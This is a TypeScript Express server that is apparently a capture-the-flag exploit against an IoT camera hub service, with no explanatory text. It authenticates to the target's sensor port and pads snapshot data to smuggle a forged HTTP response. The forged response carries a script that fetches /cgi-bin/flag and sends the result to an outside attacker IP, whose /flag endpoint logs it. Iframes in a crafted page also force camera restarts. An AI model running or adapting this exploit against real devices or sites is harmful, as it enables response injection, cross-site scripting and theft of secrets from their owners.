import express from "express";
import { Socket } from "net";
import { PromiseSocket } from "promise-socket";
import morgan from "morgan";

const { TARGET_IP, SENSOR_PORT, SENSOR_TOKEN } = process.env;
const packetSize = 1448;
const SELF = "67.171.68.180:12345";
const TARGET = "iot.hub";

let connected = false;
const socket = new PromiseSocket(new Socket());

const socketOk = async () => {
	let data = await socket.read();
	if (!data?.toString().includes("ok\n")) {
		await socketOk();
	}
};

const app = express();

app.use((req, res, next) => {
	next();
});

app.use(morgan("dev"));

app.get("/flag", (req, res) => {
	console.log(req.query.flag);
	res.send("pwn'd");
});

app.get("/", async (req, res) => {
	await init();
	res.redirect(`http://${TARGET}/data/snapshot/target`);
});

const BIG_CONTENT = "A".repeat(packetSize * 400);

app.get("/pwn", async (req, res) => {
	const payload = `<script>fetch("/cgi-bin/flag").then((r) => r.text()).then((flag) => fetch("http://${SELF}/flag?flag="+flag))</script>`;
	await snapshot("a", BIG_CONTENT + `
		HTTP/1.1 200 OK
		Content-Type: text/html
		Content-Length: ${payload.length}

		${payload}
	`);
	res.status(200).send();
});

async function snapshot(name: string, value: string) {
	socket.write(`${name}\n`);
	socket.write(`${value.length}\n`);
	socket.write(value);
	await socketOk();
}

async function init() {
	if (!connected) {
		await socket.connect(parseInt(SENSOR_PORT!, 10), TARGET_IP);

		console.log("connected");

		await socket.read();
		await socket.write(SENSOR_TOKEN! + "\n");
		await socket.read();
	}

	console.log("writing snapshots");

	await snapshot("a", BIG_CONTENT);
	await snapshot("b", "hi");
	await snapshot("c", "hi");
	await snapshot("d", "hi");
	await snapshot("e", "hi");
	await snapshot("target", `
	<!DOCTYPE html>
	<img src="http://${SELF}/pwn" />
	<iframe src="http://${TARGET}/data/snapshot/a"></iframe>
	<iframe src="http://${TARGET}/cgi-bin/restart?camera=a"></iframe>
	<iframe src="http://${TARGET}/cgi-bin/restart?camera=b"></iframe>
	<iframe src="http://${TARGET}/cgi-bin/restart?camera=c"></iframe>
	<iframe src="http://${TARGET}/cgi-bin/restart?camera=d"></iframe>
	<iframe src="http://${TARGET}/cgi-bin/restart?camera=e"></iframe>
	<iframe src="http://${TARGET}/win"></iframe>
	`);

	console.log("ready!");
}

async function run() {
	app.listen(12345);
}

run();
